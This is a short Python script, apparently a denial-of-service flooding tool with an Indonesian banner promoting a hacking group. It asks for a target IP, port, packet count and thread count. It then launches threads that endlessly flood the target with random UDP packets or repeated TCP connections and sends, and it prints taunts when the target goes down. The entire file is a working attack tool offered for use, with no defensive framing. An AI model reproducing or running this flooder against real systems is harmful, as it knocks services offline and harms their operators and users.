import random
import socket
import threading

print       (" - - > XC Razzel Ni Dek!! < - - ")
print       (" - - > Tolls By XRazzel!!!! < - - ")
print       (" - - > Join XC TEAM <- - ")                                   
print       (" - - > Nomor Wa:085217524276!! < - - ")
print       (" - - > Xyber Comunity  < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - >  How Are You Ready?  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" How Are You Ready? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(512)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Easy Kali Men Haha!!! ")
		except:
			print("[!] Yahaha Down Hayukk!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Easy Kali Men Haha!!! ")
		except:
			s.close()
			print("[*] Yahaha Down Hayukk!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()